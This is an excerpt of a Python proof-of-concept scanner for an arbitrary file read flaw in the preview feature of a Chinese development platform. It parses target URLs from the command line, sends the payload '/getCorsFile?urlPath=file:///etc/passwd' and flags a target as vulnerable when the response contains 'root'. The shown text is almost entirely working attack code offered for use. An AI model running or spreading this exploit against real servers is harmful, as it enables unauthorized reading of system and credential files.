...
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                      
                                        version:真内控国产化开发平台 preview 任意文件读取漏洞
...
def main():
    ...
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="真内控国产化开发平台 preview 任意文件读取漏洞")
...
#定义poc
def poc(target):
    payload = "/getCorsFile?urlPath=file:///etc/passwd"
    url = target+payload
    proxies = {
    ...
    try:
        if re.status_code == 200 and 'root' in re.text:
            print(f'[+++]该{target}存在真内控国产化开发平台 preview 任意文件读取漏洞')
